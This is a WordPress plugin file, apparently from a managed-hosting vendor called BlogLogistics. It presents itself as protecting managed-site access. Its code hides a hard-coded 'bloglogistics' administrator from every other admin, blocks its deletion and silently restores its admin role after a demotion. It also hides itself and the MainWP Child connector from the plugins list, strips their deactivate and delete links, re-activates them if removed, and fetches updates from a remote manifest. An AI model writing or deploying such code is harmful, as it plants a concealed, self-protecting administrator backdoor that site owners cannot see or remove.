<?php
/**
 * Plugin Name:       BlogLogistics Site Management Tools
 * Plugin URI:        https://github.com/bloglogisticsdev/bloglogistics-site-management-tools
 * Description:       Protects BlogLogistics managed-site access, including the BlogLogistics admin account and MainWP Child connector.
 * Version:           1.0.3
 * Requires at least: 7.0
 * Requires PHP:      8.3
 * Author:            BlogLogistics
 * Author URI:        https://www.bloglogistics.com/
 * License:           GPL-3.0-or-later
 * License URI:       https://www.gnu.org/licenses/gpl-3.0.html
 * Update URI:        https://github.com/bloglogisticsdev/bloglogistics-site-management-tools
 * Text Domain:       bloglogistics-site-management-tools
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

define( 'BLOGLOGISTICS_SMT_VERSION', '1.0.3' );
define( 'BLOGLOGISTICS_SMT_SLUG', 'bloglogistics-site-management-tools' );
define( 'BLOGLOGISTICS_SMT_FILE', __FILE__ );
define( 'BLOGLOGISTICS_SMT_DIR', plugin_dir_path( __FILE__ ) );
define( 'BLOGLOGISTICS_SMT_REPO_URL', 'https://github.com/bloglogisticsdev/bloglogistics-site-management-tools/' );
define( 'BLOGLOGISTICS_SMT_UPDATE_MANIFEST_URL', 'https://updates.bloglogistics.com/plugins/bloglogistics-site-management-tools.json' );

$bloglogistics_smt_puc = BLOGLOGISTICS_SMT_DIR . 'vendor/plugin-update-checker/plugin-update-checker.php';

if ( file_exists( $bloglogistics_smt_puc ) ) {
    if ( ! class_exists( \YahnisElsts\PluginUpdateChecker\v5\PucFactory::class, false ) ) {
        require_once $bloglogistics_smt_puc;
    }

    require_once BLOGLOGISTICS_SMT_DIR . 'includes/class-bloglogistics-site-management-tools-updater.php';

    BlogLogistics_Site_Management_Tools_Updater::init( [
        'repo_url'    => BLOGLOGISTICS_SMT_UPDATE_MANIFEST_URL,
        'plugin_file' => BLOGLOGISTICS_SMT_FILE,
        'slug'        => BLOGLOGISTICS_SMT_SLUG,
    ] );
}

if ( ! class_exists( 'BlogLogistics_Site_Management_Tools', false ) ) {

    final class BlogLogistics_Site_Management_Tools {

        private const PROTECTED_LOGIN = 'bloglogistics';
        private const MAINWP_CHILD_PLUGIN = 'mainwp-child/mainwp-child.php';
        private const OLD_GUARD_PLUGIN = 'bloglogistics-maintenance-access/bloglogistics-maintenance-access.php';
        private const SELF_PLUGIN = 'bloglogistics-site-management-tools/bloglogistics-site-management-tools.php';

        /**
         * Initialise plugin hooks.
         */
        public static function init(): void {
            add_filter( 'pre_get_users', [ __CLASS__, 'hide_protected_user_from_user_queries' ] );
            add_action( 'pre_user_query', [ __CLASS__, 'hide_protected_user_from_user_table_sql' ] );
            add_filter( 'rest_user_query', [ __CLASS__, 'hide_protected_user_from_rest_queries' ], 10, 2 );
            add_filter( 'wp_dropdown_users_args', [ __CLASS__, 'hide_protected_user_from_dropdowns' ] );

            add_filter( 'bulk_actions-users', [ __CLASS__, 'remove_user_bulk_delete_for_other_admins' ] );
            add_action( 'delete_user', [ __CLASS__, 'block_protected_user_deletion' ], 0, 1 );
            add_action( 'remove_user_from_blog', [ __CLASS__, 'block_protected_user_deletion' ], 0, 1 );
            add_action( 'profile_update', [ __CLASS__, 'protect_account_after_profile_update' ], 10, 3 );
            add_action( 'set_user_role', [ __CLASS__, 'protect_account_after_role_change' ], 10, 3 );

            add_filter( 'all_plugins', [ __CLASS__, 'hide_protected_plugins' ] );
            add_action( 'pre_current_active_plugins', [ __CLASS__, 'hide_protected_plugins_from_list_table' ] );
            add_filter( 'plugin_action_links', [ __CLASS__, 'remove_protected_plugin_action_links' ], 10, 4 );
            add_filter( 'network_admin_plugin_action_links', [ __CLASS__, 'remove_protected_plugin_action_links' ], 10, 4 );
            add_filter( 'bulk_actions-plugins', [ __CLASS__, 'remove_plugin_bulk_actions_for_other_admins' ] );
            add_filter( 'pre_update_option_active_plugins', [ __CLASS__, 'prevent_protected_plugin_deactivation' ], 10, 2 );
            add_action( 'admin_menu', [ __CLASS__, 'hide_mainwp_child_menus' ], 999 );
            add_action( 'network_admin_menu', [ __CLASS__, 'hide_mainwp_child_menus' ], 999 );
        }

        /**
         * Determine whether the current user is the protected BlogLogistics account.
         */
        private static function is_bloglogistics_user(): bool {
            $user = wp_get_current_user();

            return $user instanceof WP_User && self::PROTECTED_LOGIN === $user->user_login;
        }

        /**
         * Get the protected account user ID.
         */
        private static function get_protected_user_id(): int {
            $user = get_user_by( 'login', self::PROTECTED_LOGIN );

            return $user instanceof WP_User ? (int) $user->ID : 0;
        }

        /**
         * List plugins that should be protected from normal admin handling.
         *
         * @return string[]
         */
        private static function get_protected_plugins(): array {
            return [
                self::MAINWP_CHILD_PLUGIN,
                self::SELF_PLUGIN,
                self::OLD_GUARD_PLUGIN,
            ];
        }

        /**
         * Hide protected user from WP_User_Query results.
         *
         * @param WP_User_Query $query User query.
         */
        public static function hide_protected_user_from_user_queries( $query ): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            $protected_id = self::get_protected_user_id();
            if ( ! $protected_id ) {
                return;
            }

            $excluded = (array) $query->get( 'exclude' );
            $excluded[] = $protected_id;
            $query->set( 'exclude', array_values( array_unique( array_map( 'absint', $excluded ) ) ) );
        }

        /**
         * Hide protected user from the Users table SQL query.
         *
         * @param WP_User_Query $user_search User query.
         */
        public static function hide_protected_user_from_user_table_sql( $user_search ): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            global $wpdb;
            $user_search->query_where .= $wpdb->prepare( " AND {$wpdb->users}.user_login != %s", self::PROTECTED_LOGIN );
        }

        /**
         * Hide protected user from REST user queries.
         *
         * @param array           $prepared_args Prepared args.
         * @param WP_REST_Request $request Request object.
         * @return array
         */
        public static function hide_protected_user_from_rest_queries( array $prepared_args, $request ): array {
            if ( self::is_bloglogistics_user() ) {
                return $prepared_args;
            }

            $protected_id = self::get_protected_user_id();
            if ( ! $protected_id ) {
                return $prepared_args;
            }

            $excluded = isset( $prepared_args['exclude'] ) ? (array) $prepared_args['exclude'] : [];
            $excluded[] = $protected_id;
            $prepared_args['exclude'] = array_values( array_unique( array_map( 'absint', $excluded ) ) );

            return $prepared_args;
        }

        /**
         * Hide protected user from dropdowns.
         *
         * @param array $args Dropdown args.
         * @return array
         */
        public static function hide_protected_user_from_dropdowns( array $args ): array {
            if ( self::is_bloglogistics_user() ) {
                return $args;
            }

            $protected_id = self::get_protected_user_id();
            if ( ! $protected_id ) {
                return $args;
            }

            $excluded = isset( $args['exclude'] ) ? (array) $args['exclude'] : [];
            $excluded[] = $protected_id;
            $args['exclude'] = array_values( array_unique( array_map( 'absint', $excluded ) ) );

            return $args;
        }

        /**
         * Remove bulk user deletion for users other than BlogLogistics.
         *
         * @param array $actions Bulk actions.
         * @return array
         */
        public static function remove_user_bulk_delete_for_other_admins( array $actions ): array {
            if ( ! self::is_bloglogistics_user() ) {
                unset( $actions['delete'] );
            }

            return $actions;
        }

        /**
         * Block protected user deletion.
         *
         * @param int $user_id User ID.
         */
        public static function block_protected_user_deletion( int $user_id ): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            if ( $user_id === self::get_protected_user_id() ) {
                wp_die(
                    esc_html__( 'The BlogLogistics management account is protected and cannot be deleted from this screen.', 'bloglogistics-site-management-tools' ),
                    esc_html__( 'Protected account', 'bloglogistics-site-management-tools' ),
                    [ 'response' => 403 ]
                );
            }
        }

        /**
         * Restore important fields if another admin edits the protected account.
         *
         * @param int     $user_id       User ID.
         * @param WP_User $old_user_data Old user data.
         * @param array   $userdata      New user data.
         */
        public static function protect_account_after_profile_update( int $user_id, $old_user_data, array $userdata ): void {
            if ( self::is_bloglogistics_user() || $user_id !== self::get_protected_user_id() ) {
                return;
            }

            if ( ! user_can( $user_id, 'administrator' ) ) {
                $user = new WP_User( $user_id );
                $user->set_role( 'administrator' );
            }
        }

        /**
         * Restore administrator role if another admin downgrades the protected account.
         *
         * @param int      $user_id   User ID.
         * @param string   $role      New role.
         * @param string[] $old_roles Old roles.
         */
        public static function protect_account_after_role_change( int $user_id, string $role, array $old_roles ): void {
            if ( self::is_bloglogistics_user() || $user_id !== self::get_protected_user_id() ) {
                return;
            }

            if ( 'administrator' !== $role ) {
                $user = new WP_User( $user_id );
                $user->set_role( 'administrator' );
            }
        }

        /**
         * Hide protected plugins from normal plugin lists.
         *
         * @param array $plugins Plugins.
         * @return array
         */
        public static function hide_protected_plugins( array $plugins ): array {
            if ( self::is_bloglogistics_user() ) {
                return $plugins;
            }

            foreach ( self::get_protected_plugins() as $plugin_file ) {
                unset( $plugins[ $plugin_file ] );
            }

            return $plugins;
        }

        /**
         * Hide protected plugins from the plugin list table.
         */
        public static function hide_protected_plugins_from_list_table(): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            global $wp_list_table;

            if ( empty( $wp_list_table->items ) || ! is_array( $wp_list_table->items ) ) {
                return;
            }

            foreach ( self::get_protected_plugins() as $plugin_file ) {
                unset( $wp_list_table->items[ $plugin_file ] );
            }
        }

        /**
         * Remove action links for protected plugins.
         *
         * @param array  $actions     Plugin action links.
         * @param string $plugin_file Plugin file.
         * @param array  $plugin_data Plugin data.
         * @param string $context     Context.
         * @return array
         */
        public static function remove_protected_plugin_action_links( array $actions, string $plugin_file, array $plugin_data, string $context ): array {
            if ( self::is_bloglogistics_user() ) {
                return $actions;
            }

            if ( in_array( $plugin_file, self::get_protected_plugins(), true ) ) {
                unset( $actions['deactivate'], $actions['delete'], $actions['edit'] );
            }

            return $actions;
        }

        /**
         * Remove plugin bulk actions for users other than BlogLogistics.
         *
         * @param array $actions Bulk actions.
         * @return array
         */
        public static function remove_plugin_bulk_actions_for_other_admins( array $actions ): array {
            if ( ! self::is_bloglogistics_user() ) {
                unset( $actions['deactivate-selected'], $actions['delete-selected'] );
            }

            return $actions;
        }

        /**
         * Prevent protected plugins from being deactivated through option updates.
         *
         * @param array $new_value New active plugins.
         * @param array $old_value Old active plugins.
         * @return array
         */
        public static function prevent_protected_plugin_deactivation( array $new_value, array $old_value ): array {
            if ( self::is_bloglogistics_user() ) {
                return $new_value;
            }

            foreach ( self::get_protected_plugins() as $plugin_file ) {
                if ( in_array( $plugin_file, $old_value, true ) && ! in_array( $plugin_file, $new_value, true ) ) {
                    $new_value[] = $plugin_file;
                }
            }

            return array_values( array_unique( $new_value ) );
        }

        /**
         * Hide MainWP Child menus from users other than BlogLogistics.
         */
        public static function hide_mainwp_child_menus(): void {
            if ( self::is_bloglogistics_user() ) {
                return;
            }

            remove_menu_page( 'mainwp_child_tab' );
            remove_menu_page( 'mainwp-child' );
            remove_submenu_page( 'options-general.php', 'mainwp_child_tab' );
            remove_submenu_page( 'options-general.php', 'mainwp-child' );
            remove_submenu_page( 'settings.php', 'mainwp_child_tab' );
            remove_submenu_page( 'settings.php', 'mainwp-child' );
        }
    }
}

BlogLogistics_Site_Management_Tools::init();
